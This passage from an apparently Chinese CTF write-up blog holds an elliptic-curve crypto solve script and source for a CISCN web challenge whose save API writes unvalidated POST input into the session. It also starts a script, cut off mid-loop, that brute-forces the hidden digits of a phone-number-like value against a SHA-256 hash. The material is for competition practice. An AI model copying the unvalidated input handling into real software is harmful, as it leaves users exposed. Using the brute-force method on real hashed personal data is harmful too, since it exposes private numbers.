class="line"></span><br><span class="line">lam = lam[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">res = (<span class="number">4</span> * lam ** <span class="number">2</span> * (x1 ** <span class="number">3</span> + b) - <span class="number">12</span> * x1 ** <span class="number">3</span> * lam ** <span class="number">2</span> + <span class="number">4</span> * lam ** <span class="number">4</span> * x1 ** <span class="number">2</span>) % p</span><br><span class="line">aplus = cipollaAlgorithm(res, p)</span><br><span class="line"></span><br><span class="line">aplus = aplus[<span class="number">0</span>]</span><br><span class="line">plus = (<span class="number">3</span> * x1 ** <span class="number">2</span> - <span class="number">2</span> * lam ** <span class="number">2</span> * x1) % p</span><br><span class="line">a = (aplus - plus) % p</span><br><span class="line"><span class="built_in">print</span>(a) <span class="comment"># ---&gt; 这个是flag：56006392793430010663016642098239513811260175999551893260401436587175373756825079518464264729364083325</span></span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(a)[<span class="number">2</span>:]).decode())</span><br></pre></td></tr></table></figure>
<p>然后也是<span class="exturl" data-url="aHR0cHM6Ly9zYWdlY2VsbC5zYWdlbWF0aC5vcmcv">sagemath</span>网站跑一下</p>
<h1 id="ciscn"><a href="#ciscn" class="headerlink" title="ciscn"></a>ciscn</h1><h2 id="web-8"><a href="#web-8" class="headerlink" title="web"></a>web</h2><h3 id="web-so-easy-4-u"><a href="#web-so-easy-4-u" class="headerlink" title="web_so_easy_4_u"></a>web_so_easy_4_u</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-Hans&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;个人资料 - 查看&lt;/title&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;./css/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>/&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h1</span>&gt;个人资料 - 查看&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">d</span>-<span class="title">flex</span> <span class="title">justify</span>-<span class="title">content</span>-<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">card</span> <span class="title">px</span>-2&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">img</span> <span class="title">id</span>=&quot;<span class="title">avatar</span>&quot; <span class="title">width</span>=&quot;200<span class="title">px</span>&quot; <span class="title">height</span>=&quot;200<span class="title">px</span>&quot; <span class="title">class</span>=&quot;<span class="title">border</span> <span class="title">border</span>-2 <span class="title">rounded</span>-<span class="title">circle</span>&quot; <span class="title">alt</span>=&quot;<span class="title">avatar</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">card</span>-<span class="title">body</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">h5</span> <span class="title">id</span>=&quot;<span class="title">name</span>&quot; <span class="title">class</span>=&quot;<span class="title">card</span>-<span class="title">title</span>&quot;&gt;&lt;/<span class="title">h5</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span> <span class="title">id</span>=&quot;<span class="title">slogan</span>&quot; <span class="title">class</span>=&quot;<span class="title">card</span>-<span class="title">text</span>&quot;&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">a</span> <span class="title">id</span>=&quot;<span class="title">edit</span>&quot; <span class="title">href</span>=&quot;./<span class="title">edit</span>.<span class="title">php</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;编辑&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">a</span> <span class="title">id</span>=&quot;<span class="title">email</span>&quot; <span class="title">href</span>=&quot;<span class="title">mailto</span>:&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;邮我&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;./<span class="title">js</span>/@<span class="title">popperjs</span>/<span class="title">core</span>@2.11.5/<span class="title">dist</span>/<span class="title">umd</span>/<span class="title">popper</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;./<span class="title">js</span>/<span class="title">bootstrap</span>@5.2.0-<span class="title">beta1</span>/<span class="title">dist</span>/<span class="title">js</span>/<span class="title">bootstrap</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;./<span class="title">js</span>/<span class="title">jquery</span>@3.6.0/<span class="title">dist</span>/<span class="title">jquery</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="title">jQuery</span>(<span class="title">function</span> () </span>&#123;</span><br><span class="line">        $.<span class="title function_ invoke__">get</span>(<span class="string">&quot;./api/get.php&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (data.code === <span class="number">0</span>) &#123;</span><br><span class="line">                $(<span class="string">&quot;#avatar&quot;</span>).<span class="title function_ invoke__">attr</span>(<span class="string">&quot;src&quot;</span>, data.data.avatar);</span><br><span class="line">                $(<span class="string">&quot;#name&quot;</span>).<span class="title function_ invoke__">text</span>(data.data.name);</span><br><span class="line">                $(<span class="string">&quot;#slogan&quot;</span>).<span class="title function_ invoke__">text</span>(data.data.slogan);</span><br><span class="line">                $(<span class="string">&quot;#email&quot;</span>).<span class="title function_ invoke__">attr</span>(<span class="string">&quot;href&quot;</span>, <span class="string">&quot;mailto:&quot;</span> + data.data.email);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">alert</span>(data.msg);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;json&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// edit.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-Hans&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;个人资料 - 编辑&lt;/title&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;./css/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>/&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h1</span>&gt;个人资料 - 编辑&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">form</span> <span class="title">id</span>=&quot;<span class="title">form</span>&quot; <span class="title">action</span>=&quot;<span class="title">javascript</span>:&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">mb</span>-3&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">avatar</span>-<span class="title">input</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">label</span> <span class="title">mx</span>-<span class="title">auto</span> <span class="title">d</span>-<span class="title">block</span> <span class="title">text</span>-<span class="title">center</span>&quot;&gt;&lt;<span class="title">img</span> <span class="title">id</span>=&quot;<span class="title">avatar</span>&quot; <span class="title">width</span>=&quot;200<span class="title">px</span>&quot; <span class="title">height</span>=&quot;200<span class="title">px</span>&quot; <span class="title">class</span>=&quot;<span class="title">border</span> <span class="title">border</span>-2 <span class="title">rounded</span>-<span class="title">circle</span>&quot; <span class="title">alt</span>=&quot;<span class="title">avatar</span>&quot;&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">input</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">accept</span>=&quot;<span class="title">image</span>/*&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">id</span>=&quot;<span class="title">avatar</span>-<span class="title">input</span>&quot; <span class="title">aria</span>-<span class="title">describedby</span>=&quot;<span class="title">avatar</span>-<span class="title">hint</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">avatar</span>-<span class="title">hint</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">text</span>&quot;&gt;上传你滴靓照&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">mb</span>-3&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">name</span>-<span class="title">input</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">label</span>&quot;&gt;用户昵称&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">id</span>=&quot;<span class="title">name</span>-<span class="title">input</span>&quot; <span class="title">aria</span>-<span class="title">describedby</span>=&quot;<span class="title">name</span>-<span class="title">hint</span>&quot; <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">name</span>-<span class="title">hint</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">text</span>&quot;&gt;你想叫啥就叫啥&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">mb</span>-3&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">slogan</span>-<span class="title">input</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">label</span>&quot;&gt;个性签名&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">textarea</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">id</span>=&quot;<span class="title">slogan</span>-<span class="title">input</span>&quot; <span class="title">aria</span>-<span class="title">describedby</span>=&quot;<span class="title">slogan</span>-<span class="title">hint</span>&quot; <span class="title">rows</span>=&quot;3&quot; <span class="title">required</span>&gt;&lt;/<span class="title">textarea</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">slogan</span>-<span class="title">hint</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">text</span>&quot;&gt; <span class="title">ok</span>熊弟萌！全体目光朝向我看齐，看我！看我！我要宣布个事：&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">mb</span>-3&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">email</span>-<span class="title">input</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">label</span>&quot;&gt;邮箱地址&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">email</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">id</span>=&quot;<span class="title">email</span>-<span class="title">input</span>&quot; <span class="title">aria</span>-<span class="title">describedby</span>=&quot;<span class="title">email</span>-<span class="title">hint</span>&quot; <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">email</span>-<span class="title">hint</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">text</span>&quot;&gt;请输入形如&lt;<span class="title">code</span>&gt;<span class="title">foo</span>@<span class="title">bar</span>.<span class="title">abc</span>&lt;/<span class="title">code</span>&gt;的邮箱地址&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">mb</span>-3 <span class="title">form</span>-<span class="title">check</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">checkbox</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">check</span>-<span class="title">input</span>&quot; <span class="title">id</span>=&quot;<span class="title">accept</span>-<span class="title">input</span>&quot; <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">label</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">check</span>-<span class="title">label</span>&quot; <span class="title">for</span>=&quot;<span class="title">accept</span>-<span class="title">input</span>&quot;&gt;我同意&lt;<span class="title">code</span>&gt;夏基尔卞德用户资料保存与使用协议&lt;/<span class="title">code</span>&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;保存&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;./<span class="title">js</span>/@<span class="title">popperjs</span>/<span class="title">core</span>@2.11.5/<span class="title">dist</span>/<span class="title">umd</span>/<span class="title">popper</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;./<span class="title">js</span>/<span class="title">bootstrap</span>@5.2.0-<span class="title">beta1</span>/<span class="title">dist</span>/<span class="title">js</span>/<span class="title">bootstrap</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;./<span class="title">js</span>/<span class="title">jquery</span>@3.6.0/<span class="title">dist</span>/<span class="title">jquery</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="title">let</span> <span class="title">avatarHash</span> = <span class="title">null</span>;</span></span><br><span class="line"><span class="class">    <span class="title">let</span> <span class="title">avatarBase</span> = <span class="title">null</span>;</span></span><br><span class="line"><span class="class">    $(&quot;#<span class="title">avatar</span>-<span class="title">input</span>&quot;).<span class="title">on</span>(&quot;<span class="title">change</span>&quot;, <span class="title">function</span>() </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">avatar</span> = this.files[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">data</span> = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line">        data.<span class="title function_ invoke__">append</span>(<span class="string">&#x27;img&#x27;</span>, avatar);</span><br><span class="line">        $.<span class="title function_ invoke__">ajax</span>(&#123;</span><br><span class="line">            url: <span class="string">&quot;./api/img2base.php&quot;</span>,</span><br><span class="line">            data,</span><br><span class="line">            success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (data.code === <span class="number">0</span>) &#123;</span><br><span class="line">                    avatarHash = data.data.hash;</span><br><span class="line">                    avatarBase = data.data.base;</span><br><span class="line">                    $(<span class="string">&quot;#avatar&quot;</span>).<span class="title function_ invoke__">attr</span>(<span class="string">&quot;src&quot;</span>, data.data.base);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="title function_ invoke__">alert</span>(data.msg);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            dataType: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">            cache: <span class="literal">false</span>,</span><br><span class="line">            contentType: <span class="literal">false</span>,</span><br><span class="line">            processData: <span class="literal">false</span>,</span><br><span class="line">            type: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    $(<span class="string">&quot;#form&quot;</span>).<span class="title function_ invoke__">on</span>(<span class="string">&quot;submit&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">name</span> = $(<span class="string">&quot;#name-input&quot;</span>).<span class="title function_ invoke__">val</span>();</span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">slogan</span> = $(<span class="string">&quot;#slogan-input&quot;</span>).<span class="title function_ invoke__">val</span>();</span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">email</span> = $(<span class="string">&quot;#email-input&quot;</span>).<span class="title function_ invoke__">val</span>();</span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">accept</span> = $(<span class="string">&quot;#accept-input&quot;</span>).<span class="title function_ invoke__">prop</span>(<span class="string">&quot;checked&quot;</span>);</span><br><span class="line">        console.<span class="title function_ invoke__">log</span>(avatar, name, slogan, email, accept);</span><br><span class="line">        $.<span class="title function_ invoke__">post</span>(<span class="string">&quot;./api/save.php&quot;</span>, &#123;avatarHash, avatarBase, name, slogan, email, accept&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (data.code === <span class="number">0</span>) &#123;</span><br><span class="line">                location.href = <span class="string">&quot;./&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">alert</span>(data.msg);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;json&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="title function_ invoke__">jQuery</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        $.<span class="title function_ invoke__">get</span>(<span class="string">&quot;./api/get.php&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (data.code === <span class="number">0</span>) &#123;</span><br><span class="line">                $(<span class="string">&quot;#avatar&quot;</span>).<span class="title function_ invoke__">attr</span>(<span class="string">&quot;src&quot;</span>, data.data.avatar);</span><br><span class="line">                $(<span class="string">&quot;#name-input&quot;</span>).<span class="title function_ invoke__">val</span>(data.data.name);</span><br><span class="line">                $(<span class="string">&quot;#slogan-input&quot;</span>).<span class="title function_ invoke__">val</span>(data.data.slogan);</span><br><span class="line">                $(<span class="string">&quot;#email-input&quot;</span>).<span class="title function_ invoke__">val</span>(data.data.email);</span><br><span class="line">                $(<span class="string">&quot;#accept-input&quot;</span>).<span class="title function_ invoke__">prop</span>(<span class="string">&quot;checked&quot;</span>, data.data.accept);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">alert</span>(data.msg);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;json&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/api/</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;avatarHash&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;avatarHash&#x27;</span>] != <span class="string">&quot;&quot;</span>) <span class="variable">$_SESSION</span>[<span class="string">&#x27;avatar&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;avatarHash&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;slogan&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;slogan&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;accept&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;accept&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;data&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">))));</span><br></pre></td></tr></table></figure>


<h1 id="2022wdb"><a href="#2022wdb" class="headerlink" title="2022wdb"></a>2022wdb</h1><h2 id="crypto-1"><a href="#crypto-1" class="headerlink" title="crypto"></a>crypto</h2><h3 id="091"><a href="#091" class="headerlink" title="091"></a>091</h3><p>c22a563acc2a587afbfaaaa6d67bc6e628872b00bd7e998873881f7c6fdc62fc<br>通过题目描述查询资料得出前六位<br>861709xxxxxxx</p>
<p>接着直接对后面7位进行爆破：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">st = <span class="string">&quot;861709&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hua</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span 